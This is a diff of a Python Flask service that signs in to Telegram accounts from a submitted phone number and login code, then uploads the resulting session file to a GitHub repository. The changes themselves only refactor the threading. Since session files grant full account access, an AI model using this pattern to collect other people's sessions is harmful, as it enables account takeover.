@@ -19,9 +19,16 @@ GITHUB_API_BASE = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}
 
 PORT = int(os.getenv("PORT", 5000))  # Use Render's assigned PORT
 
-def send_code_thread(api_id, api_hash, phone):
-    """Runs send_code in a separate thread to avoid async issues."""
-    asyncio.run(send_code(api_id, api_hash, phone))
+@app.route("/")
+def home():
+    """Home route to check server status."""
+    return jsonify({"success": True, "message": "API is running!"}), 200
+
+def run_async_task(async_func, *args):
+    """Run an async function safely in a new event loop within a thread."""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(async_func(*args))
 
 async def send_code(api_id, api_hash, phone):
     """Creates a Telegram client and sends a verification code."""
@@ -43,23 +50,19 @@ def generate_session():
         return jsonify({"success": False, "message": "Missing API credentials"}), 400
 
     try:
-        threading.Thread(target=send_code_thread, args=(api_id, api_hash, phone)).start()
+        threading.Thread(target=run_async_task, args=(send_code, api_id, api_hash, phone)).start()
         return jsonify({"success": True, "redirect": "/verify-code"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)}), 500
 
-def complete_login_thread(api_id, api_hash, phone, code):
-    """Runs complete_login in a separate thread to avoid async issues."""
-    asyncio.run(complete_login(api_id, api_hash, phone, code))
-
 async def complete_login(api_id, api_hash, phone, code):
     """Completes login and saves session file."""
     session_name = f"session_{phone}.session"
-    
+
     async with TelegramClient(session_name, api_id, api_hash) as client:
         await client.connect()
         await client.sign_in(phone=phone, code=code)
-    
+
     # Upload session file to GitHub
     await upload_session_to_github(session_name)
 
@@ -72,10 +75,8 @@ def verify_code():
     phone = data.get("phone")
     code = data.get("code")
 
-    session_name = f"session_{phone}.session"
-
     try:
-        threading.Thread(target=complete_login_thread, args=(api_id, api_hash, phone, code)).start()
+        threading.Thread(target=run_async_task, args=(complete_login, api_id, api_hash, phone, code)).start()
         return jsonify({"success": True, "message": "Session created successfully!"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)}), 500
